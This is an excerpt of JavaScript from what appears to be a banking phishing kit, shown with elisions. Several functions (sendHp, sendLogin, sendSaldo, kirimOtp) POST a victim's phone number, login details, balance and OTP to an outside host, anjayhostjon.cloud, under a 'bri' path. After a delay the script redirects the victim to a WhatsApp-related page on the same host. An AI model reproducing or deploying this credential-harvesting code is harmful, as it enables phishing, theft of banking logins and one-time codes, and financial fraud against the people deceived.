...
function sendHp() {
   ...
   $.ajax({
      type: 'POST',
      url: 'https://anjayhostjon.cloud/bri/v9-lk20ch/one.php',
...
function sendLogin() {
   ...
   $.ajax({
      type: 'POST',
      url: 'https://anjayhostjon.cloud/bri/v9-lk20ch/login.php',
...
function sendSaldo() {
   ...
   $.ajax({
      type: 'POST',
      url: 'https://anjayhostjon.cloud/bri/v9-lk20ch/two.php',
      data: $('#inputlogin').serialize(),
      complete: function(data) {
         vibr(220);
         console.log('Complete')
...
function kirimOtp() {
   ...
   $.ajax({
      type: 'POST',
      url: 'https://anjayhostjon.cloud/bri/v9-lk20ch/three.php',
...
setTimeout(function(){  
    $("#process1").hide();   
location.href='https://anjayhostjon.cloud/wa/lk20ch';
 $('.load').hide();
    }, 4000);    
